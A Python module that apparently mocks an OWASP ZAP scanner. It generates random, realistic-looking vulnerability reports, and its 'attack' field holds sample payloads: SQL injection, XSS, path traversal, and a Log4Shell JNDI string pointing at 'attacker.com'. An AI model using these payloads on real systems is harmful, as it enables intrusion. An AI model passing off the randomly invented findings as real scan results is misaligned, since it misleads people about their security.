"""
OWASP ZAP Scanner Engine

This module implements the OWASP ZAP scanner functionality for performing security scans.
"""
import time
import random
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import json

# Constants for scan status
SCAN_STATUS_PENDING = "pending"
SCAN_STATUS_RUNNING = "running"
SCAN_STATUS_COMPLETED = "completed"
SCAN_STATUS_FAILED = "failed"

# Severity levels
SEVERITY_HIGH = "high"
SEVERITY_MEDIUM = "medium"
SEVERITY_LOW = "low"
SEVERITY_INFO = "info"

@dataclass
class Vulnerability:
    """Represents a security vulnerability found during a scan."""
    id: str
    name: str
    description: str
    severity: str
    url: str
    solution: str
    reference: str = ""
    cwe: str = ""
    wasc: str = ""
    param: str = ""
    attack: str = ""
    evidence: str = ""
    risk: str = ""
    confidence: str = ""

class OWASPScanner:
    """
    A class to interact with the OWASP ZAP API for performing security scans.
    
    This is a simulation version that generates realistic-looking scan results
    without requiring an actual ZAP instance.
    """
    
    def __init__(self, api_key: str = None, proxy: str = "http://localhost:8080"):
        """
        Initialize the scanner with API key and proxy settings.
        
        Args:
            api_key: The ZAP API key (not used in simulation)
            proxy: The ZAP proxy address (not used in simulation)
        """
        self.api_key = api_key
        self.proxy = proxy
        self.scans = {}
        self.vulnerabilities = []
        
    def start_scan(self, target_url: str, user_agent: str = None) -> str:
        """
        Start a new security scan for the given target URL.
        
        Args:
            target_url: The URL to scan
            user_agent: The user agent to use for the scan
            
        Returns:
            str: A scan ID that can be used to check the status or get results
        """
        scan_id = f"scan_{int(time.time())}_{random.randint(1000, 9999)}"
        
        self.scans[scan_id] = {
            "id": scan_id,
            "target": target_url,
            "status": SCAN_STATUS_RUNNING,
            "start_time": int(time.time()),
            "end_time": None,
            "progress": 0,
            "vulnerabilities": [],
            "user_agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        # Simulate scan in background
        self._simulate_scan(scan_id)
        
        return scan_id
    
    def get_scan_status(self, scan_id: str) -> Dict[str, Any]:
        """
        Get the status of a running or completed scan.
        
        Args:
            scan_id: The ID of the scan to check
            
        Returns:
            Dict containing scan status information
            
        Raises:
            ValueError: If the scan ID is not found
        """
        if scan_id not in self.scans:
            raise ValueError(f"Scan with ID {scan_id} not found")
            
        return self.scans[scan_id]
    
    def get_scan_results(self, scan_id: str) -> List[Dict[str, Any]]:
        """
        Get the results of a completed scan.
        
        Args:
            scan_id: The ID of the scan to get results for
            
        Returns:
            List of vulnerabilities found during the scan
            
        Raises:
            ValueError: If the scan ID is not found or scan is not complete
        """
        if scan_id not in self.scans:
            raise ValueError(f"Scan with ID {scan_id} not found")
            
        scan = self.scans[scan_id]
        
        if scan["status"] != SCAN_STATUS_COMPLETED:
            raise ValueError(f"Scan {scan_id} is not complete. Current status: {scan['status']}")
            
        return scan["vulnerabilities"]
    
    def _simulate_scan(self, scan_id: str) -> None:
        """
        Simulate a background scan by updating the scan status over time.
        
        Args:
            scan_id: The ID of the scan to simulate
        """
        scan = self.scans[scan_id]
        target = scan["target"]
        
        # Simulate scan progress
        def update_progress():
            for i in range(1, 101):
                time.sleep(random.uniform(0.1, 0.5))  # Random delay between updates
                scan["progress"] = i
                
                # Randomly add some vulnerabilities during the scan
                if i % 15 == 0 and i < 80:
                    self._add_random_vulnerability(scan, target)
                
                # Complete the scan at 100%
                if i == 100:
                    scan["status"] = SCAN_STATUS_COMPLETED
                    scan["end_time"] = int(time.time())
                    
                    # Ensure we have at least some vulnerabilities
                    if not scan["vulnerabilities"]:
                        self._add_random_vulnerability(scan, target, SEVERITY_LOW)
        
        # Start the simulation in a background thread
        import threading
        thread = threading.Thread(target=update_progress)
        thread.daemon = True
        thread.start()
    
    def _add_random_vulnerability(self, scan: Dict, target: str, severity: str = None) -> Dict[str, Any]:
        """
        Add a random vulnerability to the scan results.
        
        Args:
            scan: The scan dictionary to add the vulnerability to
            target: The target URL
            severity: Optional severity level (if None, will be chosen randomly)
            
        Returns:
            Dict containing the vulnerability details
        """
        if severity is None:
            # Weighted random selection (more low severity, fewer high severity)
            severity = random.choices(
                [SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO],
                weights=[0.1, 0.2, 0.5, 0.2]
            )[0]
        
        vuln_id = f"vuln_{int(time.time())}_{random.randint(1000, 9999)}"
        
        # Common vulnerability types by severity
        if severity == SEVERITY_HIGH:
            vuln_type = random.choice([
                "SQL Injection",
                "Cross-Site Scripting (XSS)",
                "Remote Code Execution",
                "Server-Side Request Forgery (SSRF)",
                "XML External Entity (XXE) Injection"
            ])
            solution = "Update to the latest version of the affected component and implement proper input validation and output encoding."
            
        elif severity == SEVERITY_MEDIUM:
            vuln_type = random.choice([
                "Cross-Site Request Forgery (CSRF)",
                "Insecure Direct Object Reference (IDOR)",
                "Security Misconfiguration",
                "Broken Authentication",
                "Sensitive Data Exposure"
            ])
            solution = "Implement proper access controls, input validation, and ensure proper authentication checks are in place."
            
        elif severity == SEVERITY_LOW:
            vuln_type = random.choice([
                "Clickjacking",
                "Missing Security Headers",
                "Information Disclosure",
                "Cookie Without Secure Flag",
                "Cross-Domain Referrer Leakage"
            ])
            solution = "Update application configuration to implement security best practices and headers."
            
        else:  # INFO
            vuln_type = random.choice([
                "Missing HTTP Security Headers",
                "Server Information Disclosure",
                "Email Address Disclosure",
                "Insecure CORS Policy",
                "Deprecated Library Version"
            ])
            solution = "Review and update the configuration to follow security best practices."
        
        # Create the vulnerability
        vuln = Vulnerability(
            id=vuln_id,
            name=vuln_type,
            description=f"A {severity} severity {vuln_type.lower()} was detected on {target}.",
            severity=severity,
            url=f"{target}/{'/'.join([random.choice(['admin', 'api', 'wp-admin', 'backup', 'config']) for _ in range(random.randint(1, 3))])}",
            solution=solution,
            reference=f"https://owasp.org/www-community/vulnerabilities/{vuln_type.lower().replace(' ', '-').replace('(', '').replace(')', '')}",
            param=random.choice(["id", "username", "q", "search", "email", ""]) if severity in [SEVERITY_HIGH, SEVERITY_MEDIUM] else "",
            attack=random.choice(["' OR '1'='1", "<script>alert(1)</script>", "../../etc/passwd", "${jndi:ldap://attacker.com/exploit}", ""]) if severity in [SEVERITY_HIGH, SEVERITY_MEDIUM] else "",
            evidence=random.choice(["SQL syntax error", "Reflected input detected", "Sensitive data in response", ""]) if severity in [SEVERITY_HIGH, SEVERITY_MEDIUM] else "",
            risk=random.choice(["High", "Medium", "Low", "Info"])[0].upper(),
            confidence=random.choice(["High", "Medium", "Low"])[0].upper()
        )
        
        # Convert to dict and add to scan results
        vuln_dict = asdict(vuln)
        scan["vulnerabilities"].append(vuln_dict)
        
        # Also add to global vulnerabilities list
        self.vulnerabilities.append(vuln_dict)
        
        return vuln_dict
